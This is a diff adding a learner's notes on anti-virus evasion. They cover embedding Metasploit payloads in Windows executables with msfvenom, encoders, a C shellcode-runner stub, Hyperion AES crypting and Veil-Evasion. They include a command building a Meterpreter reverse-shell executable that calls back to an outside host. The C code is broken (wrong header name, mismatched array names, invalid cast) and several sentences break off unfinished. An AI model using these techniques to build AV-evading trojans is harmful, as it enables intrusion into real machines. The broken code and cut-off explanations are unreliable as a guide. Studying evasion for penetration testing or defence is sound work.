@@ -1,0 +1,67 @@
+/** Bypassing anti-virus software
+ 
+ Using MsfVenom to make a binary trojan executable payload: 
+	New options:
+		-x: sets the template (in our case the windows binary template) via path of our standalone payload
+			This template is where our payload will be embedded in
+		-k: runs the payload in a separate thread alongside the runnig process
+		
+		-e: followed by the encoder we're going to use, this option sets our encoder to deploy 
+			msfvenom -l encoders: lists all encoders available in msfvenom
+ 
+ Encoders:
+	Encoders mangle payloads and attatch decoding instructions to them, needed to decode and run the payload.
+	Encoders also serve to obfuscate payloads in an attempt to avoid detection from 
+	
+ Custom cross compiling:
+	Custom cross compiling is the process of compiling our payloads into 
+	
+	Custom cross compiling in C code:
+	//formulate a function in C to serve as a place holder for masking our payload 
+	#include <studio.h>
+	unsigned char ranom[]; //adds some randomness for the sake of avoiding detection
+	unsigned char shellcode[]; //this array contains the hex byte of our payload
+	
+	int main(void) //we pass void through here so that the fuction doesn't return any value (it's like a void function, it just runs)
+	{
+		(void(*)())shellcode();
+		
+	}
+	
+	//Create the hexidexamal bytes for the payload by loading the payload (don't forget the encoder) by loading the 
+	  standalone payload into a type C file using the -f format 
+	  
+	// copy the output of the commands into the C file and set the shellcode[] array equal to that
+	// Next go to the /dev/urandom directory in order to use the urandom file contents to generate random output 
+	// Use the following command 
+			cat /dev/urandom | tr -dc A-Z-a-z-0-9    //tr will translate the unreadable contents of urandom into a more readable format 
+	//copy the contents into the random[] array 
+	//compile the program and this should run, masking a metersploit payload into a C program 
+	//use the cross compiler mingw32 to cross compile from linux repositories
+	
+Encrypting executable payloads via Hyperion:
+	
+	Hyperion:
+		-Hyperion uses the AES(Advanced Encryption Standard) Encryption method to secure data.
+		 After Hyperion encryptes some form of data, it tosses the keys, and brute forces itself to decrypt itelf 
+		 back to the original piece of data it encrypted. 
+		
+		-We can use this method as another means to obfuscate our standalone payload for injection 
+		
+		Encrypting an executable file 
+			msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.2.9 LPORT=2345 -f exe > meterpreter.ext 
+			cd Hyperion-1.0/   //changes us to the directory of Hyperion
+			wine ../hyperion ../meterpreter.ext bypassavhyperion.exe //hyperion is meant to run on windows machines, so we use wine to run it on windows 
+			
+Evading anti-virus with Veil-Evasion:
+	
+	Veil-Evasion:
+		Python framework that specialises in automating anti-virus evading payloads, providing choices of various techniques to use 
+		Veil-Evasion also has the ability to encrypt our executables via AES encryption 
+		
+		* Change to the Veil-Evasion-master directory from the "~" directory.
+		* Run the ./Veil-Evasion.py file
+		* Select your options for method
+		* When done run the command generate in the prompt to run the exploit 
+	
+	
